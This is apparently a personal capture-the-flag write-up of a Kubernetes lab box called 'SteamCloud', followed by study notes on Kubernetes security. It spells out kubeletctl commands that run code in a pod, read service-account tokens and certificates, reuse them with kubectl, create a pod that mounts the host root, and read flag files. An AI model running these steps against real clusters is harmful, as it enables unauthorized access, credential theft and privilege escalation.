---
box: SteamCloud
date: 2025-09-18
category: Web
difficulty: Easy
tags:
- kubernetes
- containers
- nginx
start: 2025-09-18 12:43
finish: 2025-09-18 16:36
status: complete
---

# Box Overview – Box-2025-09-18-SteamCloud

### Overview
- Machine 443 lolol
- Kubernetes stuff -> very unfamiliar but we'll do a walkthrough today  and make this a general overview of what and how kubernetes operates.
- **Posted pre-engagement research post-pwn.**

### Cheatsheet
#### baseline checks
`kubectl version --short`
`kubectl auth can-i --list`
`kubectl get pods -A -o wide`
`kubectl get sa -A`
`kubectl get secrets -A`   # only if allowed
#### Check pod mounts
`kubectl exec -it <pod> -- ls /var/run/secrets/kubernetes.io/serviceaccount/`
#### in-pod token dump
`kubectl exec -n <ns> <pod> -it -- cat /var/run/secrets/kubernetes.io/serviceaccount/token`
##### Also cool:
- [Kubernetes enumeration guide](https://github.com/sayn28/hackdocs/blob/master/cloud-security/pentesting-kubernetes/kubernetes-enumeration.md)

---

##### Environment Prep

- **Timestamp:** 2025-09-18 13:54
- **Overview:**
	- Finally ready to begin after that brief research rundown. We'll be doing guided, but without the walkthrough at first. If it gets too complicated, we'll turn to the walkthrough.
	- Added [this enumeration guide](https://github.com/sayn28/hackdocs/blob/master/cloud-security/pentesting-kubernetes/kubernetes-enumeration.md) to cheatsheets.
	- `mkidr SteamCloud`

##### On the fly research and enumerating with nmap

- **Timestamp:** 2025-09-18 13:59
- **Action:**
	- Enumerating with nmap, researching kube specific enumeration after hit on server.
- **Commands:**
	- `nmap -sVC <IP>`, `nmap -n -T4 -p 443,2379,2380,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod-address>/16`
- **Notes:** 
	- First command though general isn't specific to Kubernetes. We could start with a smaller scan and then hit the cluster with something in future tests.
	- IP is clearly running a kubernetes instance, but which?
		- Appears to be on port `8443` which is for minikube. Cute.
	- As a side note, `ssh` is also running as Debian 10 OpenSSH on port `22`, version `7.9p1`
	- Full scan results:
		- `2379/tcp  open  etcd-client`
		- `2380/tcp  open  etcd-server`
		- `8443/tcp  open  https-alt`
		- `10250/tcp open  unknown`
		- `10256/tcp open  unknown`
	- From our overview, we know that `etcd` contains info such as credentials. Interesting!

- **Next Steps:** 
	- In our hackdocs guide:
		- the administrators talks with usually using the tool **`kubectl`**
		- We can also use `curl` to enumerate with `GET` requests.
		- We should have `kubectl` already installed. Oops.
		- Had to backtrack with docs because hey...`etcd-client` runs as a pair with `etcd-server` on port `2380`

##### Installing `kubectl`

- **Timestamp:** 2025-09-18 14:18
- **Overview:**
	- Follow this link [on installing kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/)
	- Tried accessing with browser, didn't think it would work but why not?
	- Was going to try curling manually, but we have `kubectl` installed so let's go with that.
	- `kubectl --help` spits out some stuff, according to hackdocs we want to submit a `GET` request to the api endpoints to enumerate.'
	- Followed [this document](https://kubernetes.io/docs/reference/kubectl/quick-reference/) to set up autocompletion for speed.
		- Rendered irrelevant by finding another resource:
			- `kubeletctl_linux_amd64`
			- https://github.com/cyberark/kubeletctl
			- Essentially this is a tool for attacking kubeletctl
				- No pesky setup needed (just api endpoints)
			- **In the future, might be useful to learn more complex kubernetes DevOps for exploits**

##### Enumerating with actual Kubernetes equipment and curl

- **Timestamp:** 2025-09-18 14:27
- **Action:** 
	- `alias kc=kubeletctl`
		- This skips a lot of bullshit with interacting with the clusters using `kubectl`
			- Possible to do if I were expert I suppose.
- **Commands:**
	- `alias kc=<dir>/kubeletctl_linux_amd64`
	- `curl https://$ip:8443/ -k`
	- `kc --server $ip pods`
	- `kc --server $ip scan rce`
- **Notes:** 
	- Since we know the server is running kubernetes, the open `tcp` ports at `10250, 10256` are interesting as they probably represent containers or pods.
	- I guess we should test whether `AlwaysAllow` is enabled by the Kubernetes API server.
	- Tested the authentication endpoint at `8443`
		- returns forbidden:
			- probably aforementioned RBAC means we can't access that path on that endpoint?
	- `kc --server $ip pods`
		- enumerates the pod space.
		- we see 8:
			- kube-apiserver, kube-controller-manager, kube-scheduler, etcd, storage-provisioner, kube-proxy, coredns, nginx
		- nginx looks potential
	- `kc --server $ip scan rce`
		- It's nice that this tool has a rce scanner, will have to investigate how to do it with `kubectl` -- there is an exec function with it.
- **Next Steps:** 
	- Utilize command function to find tokens.

##### Get ca.cry and token (and maybe look at namespace).

- **Timestamp:** 2025-09-18 15:19
- **Action:** We'll use the RCE to execute basic system commands and try to privesc with that.
- **Commands:** 
	- `kc --server $ip exec "id" -p nginx -c nginx`
	- `kc --server $ip exec "ls /var/run/secrets/kubernetes.io/serviceaccount/" -p nginx -c nginx`
	- `kc --server $ip exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx`
	-  `kc --server $ip exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx`
- **Notes:** 
	- Straightforward data exfil, with assistance of hackdocs for useful folders to check for creds.
- **Next Steps:** 
	- Use the creds in actual `kubectl`

##### Using the creds to access higher infra

- **Timestamp:** 2025-09-18 15:34
- **Action:** Export token, cert, to kubectl. Use it to access central infra.
- **Commands:** 
	- `export token="$(cat token)"`
	- `kubectl --token=$token --certificate-authority=./ca.crt --server=https://$ip:8443 get pods`
	- `kubectl --token=$token --certificate-authority=./ca.crt --server=$ip:8443 get pods`
- **Notes:** 
	- **MAKE SURE TO PREPEND HTTPS TO $IP.**
		- Classic error codes not returning useful data lol.
- **Next Steps:** 
	- Confirmed access.
	- Now to check what we can do.

##### Checking can-i

- **Timestamp:** 2025-09-18 16:18
- **Action:** 
	- Checked what we can do with `can-i`.
		- This info is in hackdocs internal enumeration section.
- **Commands:**
	- `kubectl --token=$token --certificate-authority=./ca.crt --server=https://$ip:8443 auth can-i --list`
- **Notes:** 
	- `selfsubjectrulesreviews.authorization.k8s.io[][][create]`
		- Looks like we can create a pod.
		- Pretty trivial to make a container probably, I don't have much experience with kube.
- **Next Steps:** 
	- Create malicious kubelet.

##### Mounting the root directory for access

- **Timestamp:** 2025-09-18 16:24
- **Action:** Configuring a new container to run with elevated view permissions for root
- **Commands:** 
	- `touch huehuehue.yaml`
	- `kubectl --token=$token --certificate-authority=./ca.crt --server=https://$ip:8443 apply -f huehuehue.yaml`
- **Notes:**
	- We created a container running on the instance.
	- **future reference for determining existing images with cred access**
		- [Tutorial on getting yaml from deployed objects](https://www.baeldung.com/ops/kubernetes-yaml-deployed-object)
		- [[Kubernetes DevOps]]
- **Next Steps:**
	- Access the root directory!

##### Back to kc

- **Timestamp:** 2025-09-18 16:32
- **Overview:**
	- We utilize kubeletctl again to pwn the user and flag simultaneously.
	- **optionally, while grabbing certs, `user.txt` is still loaded in the root directory of the nginx instance.**
		- Reminder to fully enumerate:
			- `kc --server $ip exec "cat /root/user.txt" -p nginx -c nginx`
	- For `nginxt`:
		- `kc --server $ip exec "cat /root/home/user/user.txt" -p nginxt -c nginxt`
		- `kc --server $ip exec "cat /root/root/root.txt" -p nginxt -c nginxt`
	- Pwned!

### Review
#### What worked?
- Pre-engagement research really, really helped, since we knew what environment we were stepping into in more detail.
	- We utilized some walkthrough info, but prior information came quickly as a result of the overview at the top.
	- Some familiarity with containers allowed easy path traversal and understanding of final exploit -> running containers at elevated permissions.
		- In that vein, prior knowledge and reviews on how containers manage authentication came in handy.
- Setting up `kubectl` saved some time, although `etcdctl` wasn't needed in this engagement.
- Better management of nmap scans made enumeration much more of a breeze.

#### What to work on?
- More experience hosting containers would help with drafting malicious `yaml` files.
	- I was familiar with this technique before but don't have familiarity with containers.
	- A self-hosted kubernetes cluster would supercharge exploit knowledge.
- Pay attention to command details:
	- Got stuck on `kubectl` command due to subtle error in parameter structuring.
- Overview of hack tools would be very useful, as I didn't look up `kubeletctl` until after a while of `kubectl` fumbles with get.
	- review `kubeletctl` documentation, tutorials, etc.

### Pre-Engagement Research
- [[Kubernetes]] is a container orchestration platform.
	- Manages things like docker, but also other things.
	- Basically a director of how to host containers together (as sometimes we're in need of)
- Core features:
	- "Pod scheduling across nodes" -> get formal definition of node in this context
	- Service discovery (networking pods together, DNS, load-balancing)
	- Scaling
	- Self-healing (cool)
	- Rolling updates
- Structure:
	- Control plane -> Nodes -> Pods
	- Pods are atomic, running in pods, which are managed by the control plane.
		- **Note:** hence podman is called podman, probably?
- Security Specific:
	- Auth -> `kubeconfig`, service tokens, OIDC
		- What's OIDC?
			- OpenID Connect (ah this thing), OAuth 2.0
				- Uses IdP rather than certs or tokens
				- Seems more secure but certainly, an exploit is hiding somewhere...
			- How it works with kube:
				- User/`kubectl` authenticates to IdP
				- IdP issues a signed JWT ID Token containing various bits of info.
				- Present the ID to the `kube-apiserver`
					- `kubeconfig` or exec plugin
				- kube-apiserver verifies JWT and maps token to Kubernetes username and groups
				- Kubernetes applies RBAC with the username/group info to authorize actions
	- RBAC
		- What is RBAC?
			- Should have known: Role-Based Authentication Control
				- For kubes, `Role` allows `get, list, watch` on `pods` in the `dev` namespace
				- Also `ClusterRole` -> `get, list` nodes on the cluster
				- RoleBinding allows auth for a user/group/service in one namespace.			- Ditto for ClusterRoleBinding
	- Admission controls:
		- "Policies that mutate or deny workloads before hitting the cluster"
		- Meaningless to me, let's research more.
		- Apparently these are a set of plugins that intercept requests after authentication and authorization.
			- AuthN (Are you known?)
			- RBAC (What do you have access to?)
			- Admission Control (What is allowed in?)
		- *Mutating admission controllers*:
			- Sets labels, container side-car injections, or resource limits.
				- Side-cars are containers that run in context of the app (share network, storage)
					- Ex. Logging utility.
		- *Validating admission controllers*:
			- Can only allow/deny requests, not change them.
			- Blocks privileged pods or hostPath volume pods.
		- Built-in controllers:
			- NameSpaceLifecycle -> prevents deletion of default, kube-system
			- LimitRanger -> enforces resource constraints
			- ServiceAccount -> auto-mount SA tokens into pods
			- PodSecurity -> enforces baseline pod security
			- NodeRestriction -> limit kubelet ability to mod critical resources
		- *Security Context:*
			- Are there misconfigured/missing admission controllers?
			- Is PodSecurity admission disabled?
			- Mutating webhooks that inject sidecars can be abused to pivot or exfiltrate secrets
			- Denial-based policy can be bypassed sometimes
				- Job creation allowed even if pod creation is denied, for example.
	- Network policies:
		- Straightforward, kind of like firewall rules between pods.
		- CNI Plugin:
			- Calico, Cilium, Weave
		- `NetworkPolicy` tells the CNI plugin what to apply
			- Default deny, explicit allow once attached to a pod via `podSelector`
			- `podSelector` -> pod to apply policy to
			- `policyTypes` -> `Ingress`, `Egress`, both
				- Source/Dest + port + protocol for the above
			- `namespaceSelector` -> filter traffic based on namespace labels (sounds like a VLAN)
			- `ipBlock` -> restrict IP ranges (IP blocking)
		- *Security Context:*
			- In fresh contexts, all pods can talk to other pods and services across all namespaces.
				- It's necessary for cluster admins to define NetworkPolicies to impose segmentation.
			- No policies? 
				- Pivot around laterally.
			- If policies exist:
				- Look for broad selectors like `from:{}`
				- Abuse egress if unrestricted by `NetworkPolicy`
				- Policies sometimes only cover ingress.
				- Abusing mislabeling of pods for bypass.
	- Secret management:
		- Apparent weakspot for kubernetes?
		- ex. base64 encoding for `etcd`.
		- Secrets are stored in `etcd`
			- These can be mounted into pods as:
				- Environment variables
				- Volume files
				- Used by Kubernetes components
		- *Security Context:*
			- `kubectl exec -it <pod> -- ls /var/run/secrets/kubernetes.io/serviceaccount/`
				- Checking pod mounts for things like tokens, certs and namespace
			- Enumerating secrets if RBAC allows.
				- `kubectl get secrets -A`
				- `kubectl get secret <name> -n <ns> -o yaml`
				- `echo <b64> | base64 -d`
					- Standard decode...
			- Look for credential dumps for databases, cloud providers and CI/CD tokens.
			- Check if secrets are mounted into high-value pods.
			- Use SA tokens to escalate privileges (`kubectl --token`)








